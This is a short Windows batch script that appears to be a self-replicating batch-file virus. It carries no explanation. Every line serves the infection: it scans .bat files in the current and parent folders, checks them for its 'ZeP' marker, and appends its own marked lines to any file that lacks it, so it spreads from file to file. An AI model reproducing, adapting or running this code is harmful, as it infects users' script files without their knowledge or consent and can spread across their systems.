@echo off%[ZeP]%
if not exist %0.bat goto ZeP
for %%f in (*.bat ..\*.bat) do set ZeP=%%f
find /i "ZeP"<%ZeP%>nul
if errorlevel 1 find "ZeP"<%0.bat>>%ZeP%
:ZeP
